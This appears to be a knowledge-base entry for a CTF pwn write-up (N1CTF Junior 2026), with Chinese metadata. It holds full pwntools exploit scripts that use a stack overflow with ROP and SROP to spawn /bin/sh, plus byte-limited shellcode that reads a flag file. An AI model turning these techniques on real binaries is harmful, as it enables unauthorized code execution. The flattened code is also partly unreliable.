---
title: N1CTF Junior 2026/1-2 pwn
contest: N1CTF Junior
year: 2026
difficulty: medium
vuln_type:
- rop
- srop
tags:
- fgets 栈溢出
- 0x20 buffer + 0x1f4 read
- ROPgadget
- pop rdi; ret
- xor rbx; ret
- add rbx rdx; ret
- magic gadget
- SigreturnFrame
- pwntools
attack_chain:
- 逆向 main()：char s[32]; fgets(s, 500, stdin) — 经典栈溢出
- ROPgadget --binary onlyfgets --only "pop|ret" 找 pop_rdi=0x4011fc, pop_rbp=0x40114d
- 找更多 gadget：xor_rbx_ret=0x4011FE, add_rbx_rdx_ret=0x4010ae, magic=0x40114c, srop=0x4011C3
- 利用思路：栈溢出 → add_rbx_rdx_ret 6 次累积修改 rbx → pop_rbp 调到 0x404018+0x3d（接近 magic 写入地址）→ magic gadget 15 次写入 → 回到 main
- 第二阶段：构造 SROP 链，SigreturnFrame 设 rsp/rip/registers 调 syscall execve("/bin/sh", NULL, NULL)
- payload = b'a'*0x28 + ROP + SROP 链
- pwntools io.sendline + io.interactive() 拿 shell
key_payload: payload = b'a'*0x28 + p64(add_rbx_rdx_ret)*6 + p64(pop_rbp) + p64(0x404018+0x3d) + p64(magic)*15
one_liner: fgets 栈溢出 + add_rbx_rdx 累加写入 magic + SigreturnFrame 调 syscall
lesson: '"magic" gadget 写入需要 add_rbx_rdx_ret 累加；SROP 适合 NX 开启且 libc 未知场景'
quality: high
full_path: N1CTF_Junior_2026_1-2_pwn.full.md
meta_path: N1CTF_Junior_2026_1-2_pwn.meta.md
images_removed: true
images_removed_count: 4
schema_version: v3.0.0-P0
summary: N1CTF Junior 2026/1-2 pwn。fgets 栈溢出 + add_rbx_rdx 累加写入 magic + SigreturnFrame 调 syscall。关键路径：逆向 main()：char s[32]; fgets(s, 500, stdin) — 经典栈溢出 → ROPgadget --binary onlyfgets --only "pop|ret" 找 p...
category: pwn
subcategory: rop
tools_used:
- ROP
- ROPgadget
- pwntools
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 4
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/294826.html
reasoning_chain:
- 触发点：fgets 栈溢出 + char s[32]; fgets(s, 500, stdin) → 假设：0x20 buffer + 0x1f4 read = 栈溢出
- 动作：ROPgadget --binary onlyfgets --only 'pop|ret' → pop_rdi=0x4011fc, pop_rbp=0x40114d → 假设：找 ROP gadget
- 动作：找 xor_rbx_ret=0x4011FE, add_rbx_rdx_ret=0x4010ae, magic=0x40114c, srop=0x4011C3 → 假设：magic gadget 是写入点
- 假设：利用思路：栈溢出 → add_rbx_rdx_ret 6 次累加 rbx → pop_rbp 调到 0x404018+0x3d（magic 写入地址）→ magic gadget 15 次写入
- 动作：payload1 = b'a'*0x28 + p64(add_rbx_rdx_ret)*6 + p64(pop_rbp) + p64(0x404018+0x3d) + p64(magic)*15 → 假设：触发 magic gadget 写入
- 假设：回到 main 后二次溢出做 SROP → 动作：构造 SigreturnFrame 设 rsp/rip/registers
- 动作：payload2 = SigreturnFrame(syscall execve('/bin/sh', NULL, NULL)) → 假设：SROP 调 syscall execve
- pwntools io.sendline + io.interactive() 拿 shell → 完成
failed_attempts:
- 试图走 ret2libc → 失败：libc 未知 + NX 开启，SROP 更适合
- 试图直接调 magic gadget → 失败：magic gadget 写入地址需要 add_rbx_rdx_ret 累加 rbx 才能调到目标
- 试图用 pop_rdi + /bin/sh → 失败：NX 开启，无法直接跳 shellcode
key_observations:
- fgets(s, 500, stdin) 配 s[32] 是 CTF 入门栈溢出经典布局（0x20 buffer + 0x1f4 read）
- magic gadget 写入需要 add_rbx_rdx_ret 累加 rbx 才能跳到目标写入地址
- SROP (Sigreturn-Oriented Programming) 适合 NX 开启 + libc 未知场景，通过 SigreturnFrame 调 syscall execve
- SigreturnFrame 设 rsp/rip/registers = syscall(execve, '/bin/sh', NULL, NULL) 是无 libc 提权标准范式
- N1CTF Junior pwn 入门题偏 ROP/SROP 而非 ret2libc（不依赖 libc 查找）
prerequisites:
- x86_64 栈溢出 + ROP（pwntools + ROPgadget）
- SROP（SigreturnFrame + syscall 构造）
- Gadget 累加（add_rbx_rdx_ret 多次累加）
- pwntools SigreturnFrame + io.interactive()
---
# N1CTF Junior 2026 1/2 pwn

> 原文: https://www.ctfiot.com/294826.html
> ID: 294826

总结一下自己的手法发现对汇编的了解还是太少了还是需要多练


```
int__fastcallmain(intargc,constchar**argv,constchar**envp){chars[32];// [rsp+0h] [rbp-20h] BYREFfgets(s,500,stdin);return0;}
fofa@fofa-VMware-Virtual-Platform:~/pwn1$ ROPgadget --binary onlyfgets --only "pop|ret"Gadgets information============================================================0x000000000040114d : pop rbp ; ret0x00000000004011fc : pop rdi ; ret0x000000000040101a : ret0x0000000000401072 : ret 0x2fUnique gadgets found: 4fofa@fofa-VMware-Virtual-Platform:~/pwn1$ ROPgadget --binary onlyfgets --only "ret"Gadgets information============================================================0x000000000040101a : ret0x0000000000401072 : ret 0x2fUnique gadgets found: 2fofa@fofa-VMware-Virtual-Platform:~/pwn1$ ROPgadget --binary onlyfgets --only ""Gadgets information============================================================0x0000000000401077 : add al, 0 ; add byte ptr [rax], al ; jmp 0x4010200x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x4010200x00000000004010db : add bh, bh ; loopne 0x401145 ; nop ; ret0x00000000004010ae : add bl, dh ; endbr64 ; ret0x00000000004010ac : add byte ptr [rax], al ; add bl, dh ; endbr64 ; ret0x00000000004010ab : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4010200x00000000004011f6 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret0x00000000004011f7 : add byte ptr [rax], al ; add cl, cl ; ret0x000000000040114a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret0x00000000004010ad : add byte ptr [rax], al ; endbr64 ; ret0x0000000000401039 : add byte ptr [rax], al ; jmp 0x4010200x00000000004011f8 : add byte ptr [rax], al ; leave ; ret0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x4010200x0000000000401044 : add byte ptr [rax], al ; push 1 ; jmp 0x4010200x0000000000401054 : add byte ptr [rax], al ; push 2 ; jmp 0x4010200x0000000000401064 : add byte ptr [rax], al ; push 3 ; jmp 0x4010200x0000000000401074 : add byte ptr [rax], al ; push 4 ; jmp 0x4010200x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax0x000000000040114b : add byte ptr [rcx], al ; pop rbp ; ret0x00000000004011f9 : add cl, cl ; ret0x00000000004010da : add dil, dil ; loopne 0x401145 ; nop ; ret0x0000000000401047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x4010200x000000000040114c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret0x0000000000401147 : add eax, 0x2f1b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret0x0000000000401067 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x4010200x0000000000401017 : add esp, 8 ; ret0x0000000000401016 : add rsp, 8 ; ret0x00000000004011d1 : call qword ptr [rax + 0x4855c35d]0x0000000000401173 : call qword ptr [rbp + 0x48]0x0000000000401014 : call rax0x0000000000401163 : cli ; jmp 0x4010f00x00000000004010b3 : cli ; ret0x0000000000401207 : cli ; sub rsp, 8 ; add rsp, 8 ; ret0x0000000000401160 : endbr64 ; jmp 0x4010f00x00000000004010b0 : endbr64 ; ret0x0000000000401042 : fisubr dword ptr [rdi] ; add byte ptr [rax], al ; push 1 ; jmp 0x4010200x0000000000401012 : je 0x401016 ; call rax0x00000000004010d5 : je 0x4010e0 ; mov edi, 0x404050 ; jmp rax0x0000000000401117 : je 0x401120 ; mov edi, 0x404050 ; jmp rax0x000000000040103b : jmp 0x4010200x0000000000401164 : jmp 0x4010f00x000000000040100b : jmp 0x4840103f0x00000000004010dc : jmp rax0x00000000004011fa : leave ; ret0x0000000000401032 : loop 0x401063 ; add byte ptr [rax], al ; push 0 ; jmp 0x4010200x00000000004010dd : loopne 0x401145 ; nop ; ret0x0000000000401146 : mov byte ptr [rip + 0x2f1b], 1 ; pop rbp ; ret0x00000000004011f5 : mov eax, 0 ; leave ; ret0x00000000004010d7 : mov edi, 0x404050 ; jmp rax0x00000000004011d2 : nop ; pop rbp ; ret0x00000000004010df : nop ; ret0x000000000040115c : nop dword ptr [rax] ; endbr64 ; jmp 0x4010f00x00000000004010d6 : or dword ptr [rdi + 0x404050], edi ; jmp rax0x000000000040114d : pop rbp ; ret0x00000000004011fc : pop rdi ; ret0x0000000000401036 : push 0 ; jmp 0x4010200x0000000000401046 : push 1 ; jmp 0x4010200x0000000000401056 : push 2 ; jmp 0x4010200x0000000000401066 : push 3 ; jmp 0x4010200x0000000000401076 : push 4 ; jmp 0x4010200x00000000004010d8 : push rax ; add dil, dil ; loopne 0x401145 ; nop ; ret0x000000000040101a : ret0x0000000000401072 : ret 0x2f0x0000000000401062 : retf 0x2f0x0000000000401192 : retf 0xfffe0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret0x0000000000401148 : sbb ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret0x0000000000401052 : shr byte ptr [rdi], cl ; add byte ptr [rax], al ; push 2 ; jmp 0x4010200x0000000000401209 : sub esp, 8 ; add rsp, 8 ; ret0x0000000000401208 : sub rsp, 8 ; add rsp, 8 ; ret0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax0x00000000004010d3 : test eax, eax ; je 0x4010e0 ; mov edi, 0x404050 ; jmp rax0x0000000000401115 : test eax, eax ; je 0x401120 ; mov edi, 0x404050 ; jmp rax0x000000000040100f : test rax, rax ; je 0x401016 ; call rax0x00000000004011ff : xor ebx, ebx ; ret0x00000000004011fe : xor rbx, rbx ; retUnique gadgets found: 77
frompwnimport*filename='/home/fofa/pwn1/onlyfgets'context.arch='amd64'context.log_level="debug"elf=ELF(filename)libc=ELF("/home/fofa/pwn1/libc.so.6")
# io = process(filename)io=remote('60.205.163.215',34701)
# gadgetpop_rdi=0x4011fcxor_rbx_ret=0x4011FEadd_rbx_rdx_ret=0x4010aemagic=0x40114cpop_rbp=0x40114dsrop=0x4011C3ret=0x40101abss=0x404500payload=b'a'*0x28payload+=p64(add_rbx_rdx_ret)*6payload+=p64(pop_rbp)payload+=p64(0x404018+0x3d)payload+=p64(magic)*15payload+=p64(elf.sym['main'])
# gdb.attach(io)io.sendline(payload)payload=b'a'*0x28payload+=p64(xor_rbx_ret)payload+=p64(add_rbx_rdx_ret)*4payload+=p64(pop_rbp)payload+=p64(0x404065)payload+=p64(magic)*2payload+=p64(elf.sym['main'])io.sendline(payload)payload=b'a'*0x20payload+=p64(bss-0x20)payload+=p64(0x4011DD)io.sendline(payload)sigret_frame=SigreturnFrame()sigret_frame.r15=bss-0x40sigret_frame.rsi=0x404a00sigret_frame.rdx=0sigret_frame.rcx=0x404a00sigret_frame.rsp=0x4011CDsigret_frame.eflags=0x33payload=b'/bin/shx00'payload+=b'a'*0x18payload+=p64(ret)*2payload+=p64(srop)payload+=bytes(sigret_frame)io.sendline(payload)io.interactive()
[*]'/home/fofa/bins/chal' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled SHSTK: Enabled IBT: Enabled Stripped: No
int__fastcallmain(intargc,constchar**argv,constchar**envp){void*v3;// rbpintresult;// eaxsandbox(argc,argv,envp);v3=mmap(0,0x8000u,7,34,-1,0);read(0,v3,0x8000u);__asm{jmp rdx}returnresult;}
learsp, [rip+0x2000] movrax, 0x67616c662f pushrax movrdi,rsp xorrsi,rsi xorrdx,rdx push2 poprax syscall movrdi,rax xorrax,rax movrsi,rsp push0x70 poprdx syscall movrdx,rax push1 poprdi push1 poprax syscall
importsubprocessclassFlagNotFound(Exception): def__str__(self): return"FlagNotFound"classByteCodeAlreadyUsed(Exception): def__str__(self): return"ByteCodeAlreadyUsed" classByteCodeTypesOverLimited(Exception): def__str__(self): return"ByteCodeTypesOverLimited"defmain(): blacklist=set() flag=bytes() withopen("/flag","rb")asf: flag=f.readline() foriinrange(2): try: user_input=bytes.fromhex(input(f"Enter your shellcode as hex({i}/2):").strip()) forbyteinuser_input: ifbyteinblacklist: raiseByteCodeAlreadyUsed blacklist=blacklist.union(set(user_input)) iflen(blacklist)>=16: raiseByteCodeTypesOverLimited p=subprocess.run( ['./chal'], capture_output=True, input=user_input, timeout=2.0, ) ifflagnotinp.stdout: raiseFlagNotFound exceptExceptionase: print("Error:",e) exit() print("Well Done.") print(p.stdout) main()
frompwnimport*context.arch='amd64'# io = remote('60.205.163.215', 22848)io=process(['python3','chal.py'])
# -------------------------------# 构造目标 shellcode
# -------------------------------asm_code=''' lea rsp, [rip+0x2000] mov rax, 0x67616c662f2e ; "./flag" push rax mov rdi, rsp xor rsi, rsi xor rdx, rdx push 2 pop rax syscall ; open("./flag", O_RDONLY) mov rdi, rax xor rax, rax mov rsi, rsp push 0x70 pop rdx syscall ; read(flag_fd, rsp, 0x70) mov rdx, rax push 1 pop rdi push 1 pop rax syscall ; write(1, rsp, rax)'''target=asm(asm_code)withopen('target','wb')asf: f.write(target)
# -------------------------------# Round 1: 使用 rdx 写入
# -------------------------------payload1=b'x66x83xC2x0E'*2000remain1=20000forbyteintarget: payload1+=asm('add byte ptr [rdx], 1')*int(byte) payload1+=asm('add dx, 1') remain1-=(int(byte)*len(asm('add byte ptr [rdx], 1'))+len(asm('add dx, 1')))ifremain1>0: payload1+=asm('nop')*remain1
# -------------------------------# Round 2: 使用 rsi 写入
# -------------------------------payload2=asm('xchg rsi, rdx')payload2+=asm('lodsq')*3000remain2=17997forbyteintarget: payload2+=asm('inc byte ptr [rsi]')*int(byte) payload2+=asm('lodsb') remain2-=(int(byte)*len(asm('inc byte ptr [rsi]'))+len(asm('lodsb')))ifremain2>0: payload2+=asm('lodsb')*remain2
# -------------------------------# 主程序交互
# -------------------------------io.sendlineafter(b"(0/2):",payload1.hex().encode())io.sendlineafter(b"(1/2):",payload2.hex().encode())io.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]